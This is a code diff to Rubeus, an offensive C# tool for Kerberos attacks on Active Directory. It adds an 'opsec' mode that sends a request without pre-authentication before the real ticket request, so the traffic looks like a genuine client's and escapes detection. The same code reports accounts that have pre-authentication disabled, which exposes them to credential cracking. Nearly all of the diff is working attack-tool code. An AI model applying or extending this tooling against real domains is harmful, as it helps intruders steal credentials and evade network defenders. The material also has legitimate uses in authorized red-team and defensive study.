@@ -29,11 +29,15 @@ namespace Rubeus
 
     public class Ask
     {
-        public static byte[] TGT(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, string outfile, bool ptt, string domainController = "", LUID luid = new LUID(), bool describe = false)
+        public static byte[] TGT(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, string outfile, bool ptt, string domainController = "", LUID luid = new LUID(), bool describe = false, bool opsec = false)
         {
+            // send request without Pre-Auth to emulate genuine traffic
+            if (opsec)
+                NoPreAuthTGT(userName, domain, etype, domainController);
+
             try
             {
-                return InnerTGT(userName, domain, keyString, etype, outfile, ptt, domainController, luid, describe, true);
+                return InnerTGT(userName, domain, keyString, etype, outfile, ptt, domainController, luid, describe, true, opsec);
             }
             catch (KerberosErrorException ex)
             {
@@ -48,7 +52,37 @@ namespace Rubeus
             return null;
         }
 
-        public static byte[] InnerTGT(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, string outfile, bool ptt, string domainController = "", LUID luid = new LUID(), bool describe = false, bool verbose = false)
+        public static void NoPreAuthTGT(string userName, string domain, Interop.KERB_ETYPE etype, string domainController)
+        {
+            string dcIP = Networking.GetDCIP(domainController, true, domain);
+            if (String.IsNullOrEmpty(dcIP)) { return; }
+
+            byte[] reqBytes = AS_REQ.NewASReq(userName, domain, etype, true);
+
+            byte[] response = Networking.SendBytes(dcIP, 88, reqBytes);
+
+            if (response == null)
+            {
+                return;
+            }
+
+            // decode the supplied bytes to an AsnElt object
+            //  false == ignore trailing garbage
+            AsnElt responseAsn = AsnElt.Decode(response, false);
+
+            // check the response value
+            int responseTag = responseAsn.TagValue;
+
+            if (responseTag == 11)
+            {
+                Console.WriteLine("[-] AS-REQ w/o preauth successful! {0} has pre-authentication disabled!", userName);
+            }
+
+            return;
+
+        }
+
+        public static byte[] InnerTGT(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, string outfile, bool ptt, string domainController = "", LUID luid = new LUID(), bool describe = false, bool verbose = false, bool opsec = false)
         {
             if (verbose)
             {
@@ -72,7 +106,7 @@ namespace Rubeus
                 Console.WriteLine("[*] Building AS-REQ (w/ preauth) for: '{0}\\{1}'", domain, userName);
             }
 
-            byte[] reqBytes = AS_REQ.NewASReq(userName, domain, keyString, etype);
+            byte[] reqBytes = AS_REQ.NewASReq(userName, domain, keyString, etype, opsec);
 
             byte[] response = Networking.SendBytes(dcIP, 88, reqBytes);
             if (response == null)
